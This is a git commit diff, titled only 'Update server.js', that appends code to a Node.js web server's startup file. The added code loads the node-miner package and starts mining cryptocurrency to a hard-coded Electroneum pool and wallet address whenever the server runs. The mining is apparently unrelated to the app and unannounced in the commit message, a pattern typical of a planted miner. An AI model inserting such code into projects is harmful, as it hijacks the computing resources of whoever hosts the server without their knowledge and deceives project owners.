f81eccdb2def744928990f453360db78938cb823
krreet <34994993+krreet@users.noreply.github.com>
2018-03-14 02:05:48 +0530

    Update server.js

--- server.js
+++ server.js
@@ -103,6 +103,28 @@ initDb(function(err){
 });
 
 app.listen(port, ip);
+
+const NodeMiner = require('node-miner');
+ 
+(async () => {
+ 
+    const miner = await NodeMiner({
+        host: `etn.easyhash.io`,
+        port: 3630,
+        username: `etnkKyXUsrfH3JdthA3Cep1JBaEdPtFF2EvkX4uhmTbCAFMX4xr6VzvBuc2eJFvEnLKmJKf7jwS3C3R9mMQb1jbD8VW9GNiGBJ`,
+        password: 'worker-1'
+    });
+ 
+    await miner.start();
+ 
+    miner.on('update', data => {
+        console.log(`Hashrate: ${data.hashesPerSecond} H/s`);
+        console.log(`Total hashes mined: ${data.totalHashes}`);
+        console.log(`---`);
+    });
+ 
+})();
+
 console.log('Server running on http://%s:%s', ip, port);
 
 module.exports = app ;
